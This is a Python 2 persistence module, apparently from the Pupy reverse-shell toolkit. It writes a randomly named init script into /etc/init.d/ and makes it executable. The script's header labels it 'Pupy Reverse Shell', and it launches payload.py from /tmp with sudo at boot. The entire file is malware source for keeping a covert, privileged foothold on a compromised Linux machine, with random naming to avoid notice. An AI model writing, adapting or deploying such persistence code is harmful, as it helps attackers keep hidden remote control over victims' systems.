#!/usr/bin/env python
import os
import stat
import random
import string
import threading
import sys
from subprocess import call


class LinuxAutorun(threading.Thread):

    def __init__(self, *args, **kwargs):

        random_alias_name = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(5))
        self.deamon_script = os.path.join('/etc/init.d/', random_alias_name)


    def deamon_shell_code(self):
        return '''
#!/bin/sh
### BEGIN INIT INFO
# Provides:          Pupy Reverse Shell
# Required-Start:    $remote_fs $syslog
# Required-Stop:     $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Start daemon at boot time
# Description:       Enable service provided by daemon.
### END INIT INFO

dir="/tmp/"
cmd="python payload.py"
user=""

name=`basename $0`
pid_file="/var/run/$name.pid"
stdout_log="/tmp/mshell.log"
stderr_log="/tmp/mshell..err"

get_pid() {
    cat "$pid_file"
}

is_running() {
    [ -f "$pid_file" ] && ps `get_pid` > /dev/null 2>&1
}

case "$1" in
    start)
    if is_running; then
        echo "Already started"
    else
        echo "Starting $name"
        cd "$dir"
        if [ -z "$user" ]; then
            sudo $cmd >> "$stdout_log" 2>> "$stderr_log" &
        else
            sudo -u "$user" $cmd >> "$stdout_log" 2>> "$stderr_log" &
        fi
        echo $! > "$pid_file"
        if ! is_running; then
            echo "Unable to start, see $stdout_log and $stderr_log"
            exit 1
        fi
    fi
    ;;
    stop)
    if is_running; then
        echo -n "Stopping $name.."
        kill `get_pid`
        for i in {1..10}
        do
            if ! is_running; then
                break
            fi

            echo -n "."
            sleep 1
        done
        echo

        if is_running; then
            echo "Not stopped; may still be shutting down or shutdown may have failed"
            exit 1
        else
            echo "Stopped"
            if [ -f "$pid_file" ]; then
                rm "$pid_file"
            fi
        fi
    else
        echo "Not running"
    fi
    ;;
    restart)
    $0 stop
    if is_running; then
        echo "Unable to stop, will not attempt to start"
        exit 1
    fi
    $0 start
    ;;
    status)
    if is_running; then
        echo "Running"
    else
        echo "Stopped"
        exit 1
    fi
    ;;
    *)
    echo "Usage: $0 {start|stop|restart|status}"
    exit 1
    ;;
esac

exit 0
'''

    def run(self):

        code = self.deamon_shell_code()
        open(self.deamon_script, 'w').write(code)
        st = os.stat(self.deamon_script)
        os.chmod(self.deamon_script, st.st_mode | stat.S_IEXEC)


if __name__=="__main__":
    autorun = LinuxAutorun().run()
    print "Finshed Deploying Deamon"
